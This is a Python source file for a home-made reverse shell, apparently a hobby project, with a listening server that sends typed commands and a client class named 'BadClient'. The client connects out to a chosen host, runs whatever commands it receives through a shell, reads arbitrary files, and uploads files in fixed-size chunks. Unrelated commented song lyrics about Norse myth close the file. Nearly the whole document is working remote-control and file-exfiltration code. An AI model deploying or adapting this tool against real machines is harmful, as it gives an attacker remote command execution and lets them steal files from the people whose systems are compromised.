import argparse
import socket
import subprocess
import shlex
from sys import exit as exit_the_script
import os
import threading
import platform
import tqdm


def execute(cmd):
    cmd = cmd.strip()
    if not cmd:
        return
    try:
        result = subprocess.check_output(shlex.split(cmd), stderr=subprocess.STDOUT, shell=True)
    except subprocess.CalledProcessError:
        result = b"1"
    # result = subprocess.Popen(shlex.split(cmd), stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=True)
    # result = subprocess.run(shlex.split(cmd), shell=True)
    if not result:
        return b"0"
    # print(result.decode(DECODING_CONST))
    # print(result.returncode)
    # return result.stdout.read()
    return result


class ServerReverse:

    def __init__(self, target, port, name_for_file=None):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.target = target
        self.port = port

        if name_for_file:
            self.name_to_save = name_for_file
            self.file_operation = True
        else:
            self.file_operation = False

    def save_file(self, user_socket):
        file_data = b""
        packets_amt = user_socket.recv(300)
        packets_amt = int(packets_amt.decode().strip())
        bad_packets_counter = 0
        for _ in tqdm.tqdm(range(packets_amt)):
            while True:
                part_of_msg = user_socket.recv(300)
                if part_of_msg.decode().strip() == "stop" or\
                        bad_packets_counter > 20: # Here you can use not 20 but for example 1 there are 20 because I want so
                    # If something went wrong here
                    # you can put decoding const in decode func
                    # <3 ^_^
                    print(part_of_msg.decode())
                    break
                elif not part_of_msg:
                    bad_packets_counter += 1
                file_data = file_data + part_of_msg
        with open(self.name_to_save, "wb") as file_to_save:
            file_to_save.write(file_data)

        exit_the_script()

    def cmd_prompt(self, user_socket):
        # DECODING_CONST = user_socket.recv(300).decode().strip()
        while True:
            cwd = user_socket.recv(300).decode().strip()
            # cmd = input(f"{cwd}$>>> ")
            cmd = input(f"{cwd}$>>> ")
            if not cmd:
                continue
            cmd = cmd + "\n"
            user_socket.send(cmd.encode("utf-8"))
            client_response = b""

            while True:
                part_of_msg = user_socket.recv(300)
                if part_of_msg.decode(DECODING_CONST).strip() == "stop":
                    break
                client_response = client_response + part_of_msg

            print(client_response.decode(DECODING_CONST))

    def run(self):
        self.sock.bind((self.target, self.port))
        self.sock.listen(1)
        user_socket, _ = self.sock.accept()

        if self.file_operation:
            proc = threading.Thread(target=self.save_file, args=(user_socket,))
            proc.start()
        else:
            proc = threading.Thread(target=self.cmd_prompt, args=(user_socket,))
            proc.start()

        exit_the_script()


class BadClient:

    def __init__(self, target, port, path_to_f=None):
        self.client_reverse = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.client_reverse.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        self.target = target
        self.port = port
        self.path = path_to_f

    def send_file(self):
        with open(self.path, "rb") as file_byte_format:
            data = file_byte_format.read()

        start_point = 0
        step = 300
        stop_point = 300
        flag_to_stop = False
        stop_msg = b"stop" + b" " * 296
        packets_amt = int(len(data) / 300)
        packets_amt = f"{packets_amt}".encode(DECODING_CONST)
        self.client_reverse.send(packets_amt + b" " * (300 - len(packets_amt)))
        # time.sleep(0.1)
        while True:
            if flag_to_stop:
                self.client_reverse.send(stop_msg)
                print(stop_msg) # Just for Check
                break
            msg_to_send = data[start_point:stop_point]
            if len(msg_to_send) < 300:
                # msg_to_send = msg_to_send + b" " * (300 - len(msg_to_send))
                flag_to_stop = True
            start_point, stop_point = start_point + step, stop_point + step
            self.client_reverse.send(msg_to_send)
        exit_the_script()

    def cmd_prompt_client(self):

        while True:
            # Here we sending to server the current
            # working directory for easier navigating
            # DECODING_CONST = "cp866" if "Windows" in platform.platform() else ""
            self.client_reverse.send(DECODING_CONST.encode() + b"" * (300 - len(DECODING_CONST)))
            cwd = os.getcwd()
            cwd = cwd.encode() + b" " * (300 - len(cwd))
            self.client_reverse.send(cwd)

            # Main cycle wich receiving commands from server
            buffer = self.client_reverse.recv(1024).decode("utf-8")
            while not "\n" in buffer:
                sub_msg = self.client_reverse.recv(1024).decode("utf-8")
                buffer = buffer + sub_msg
            print(buffer)

            if "cd" in buffer:
                try:
                    # Sometimes can return 1 code means error but don't pay attention to this
                    # Because directory change anyway if there enough rights to do this action
                    path = shlex.split(buffer)[1]
                    os.chdir(path)
                    result = b"0"
                except Exception as error:
                    result = b"1"
                    print(f"Something went wrong {error}")

            if "read" in buffer:
                try:
                    path = shlex.split(buffer)[1]
                    with open(path, "rb") as file:
                        result = file.read()
                except Exception as err:
                    result = b"1"
                    print(f"Something went wrong {err}")
            else:
                result = execute(buffer)

            # Here I wrote a mine simple protocol one level upper than TCP/IP to send response from client to server
            # The principe is that all messages contain 300 bytes and if there whole response were send
            # Client send to server stop message

            start_point = 0
            step = 300
            stop_point = 300
            flag_to_stop = False
            stop_msg = b"stop" + b" " * 296
            while True:
                if flag_to_stop:
                    self.client_reverse.send(stop_msg)
                    break
                msg_to_send = result[start_point:stop_point]
                if len(msg_to_send) < 300:
                    msg_to_send = msg_to_send + b" " * (300 - len(msg_to_send))
                    flag_to_stop = True
                start_point, stop_point = start_point + step, stop_point + step
                self.client_reverse.send(msg_to_send)

    def run(self):
        self.client_reverse.connect((self.target, self.port))
        if self.path:
            self.send_file()
        else:
            self.cmd_prompt_client()


if __name__ == "__main__":

    # If necessary to kill the process
    print(f'[PID] {os.getpid()}\nUse taskkill /f -pid PID on windows\nkill PID on Linux if something went wrong')
    parser = argparse.ArgumentParser(description='''There is a reverse shell script which allows you to send for example files \
    or open a command prompt on from client side
    ''')

    parser.add_argument("-t", "--target", action="store", default="localhost", type=str)
    parser.add_argument("-p", "--port", action="store", default=5555, type=int)
    parser.add_argument("-s", "--server", action="store_true")

    parser.add_argument("-up", "--upload", action="store_true", default=False)
    parser.add_argument("-abp", "--absolute_path", action="store")
    parser.add_argument("-nf", "--name_for_file", action="store")

    args = parser.parse_args()

    DECODING_CONST = "cp866" if "Windows" in platform.platform() else ""
    print(DECODING_CONST)
    print(platform.platform())

    if args.server:
        # Remember that in reverse shell the server sends the commands to a client
        if args.upload:
            if not args.name_for_file:
                print("Please enter a name for file with extension")
                exit_the_script()
            server = ServerReverse(args.target, args.port, name_for_file=args.name_for_file)
        else:
            server = ServerReverse(args.target, args.port)
        socket_to_get_decoding_const = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        socket_to_get_decoding_const.bind(("0.0.0.0", 9973))
        DECODING_CONST = socket_to_get_decoding_const.recvfrom(30)[0].decode()
        if DECODING_CONST == "Window":
            DECODING_CONST = "cp866"
        else:
            DECODING_CONST = "utf-8"
        socket_to_get_decoding_const.close()
        print(DECODING_CONST)
        server.run()

    else:
        # Client which would receive commands from server
        if args.upload:
            if not args.absolute_path:
                print("Please enter path to file")
                exit_the_script()
            client = BadClient(args.target, args.port, path_to_f=args.absolute_path)
        else:
            client = BadClient(args.target, args.port)
        socket_to_send_encoding = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        msg = "Window" if DECODING_CONST else "Linux"
        socket_to_send_encoding.sendto(msg.encode(), (args.target, 9973))
        socket_to_send_encoding.close()
        print(DECODING_CONST)

        client.run()








# Odin, Allfather, are we blessed by your hand?


# A perfect darkness follows all
# A perfect silence to end the war
# Oh, Ginnungagap, oh, bottomless abyss
# It's the ultimate nothingness where death is bliss
# Axe time, sword time
# Warriors of Valhalla
# Wind time, wolf time
# Hear my final words
# Axe time, sword time
# This is our purpose
# Wind time, wolf time
# This is our end




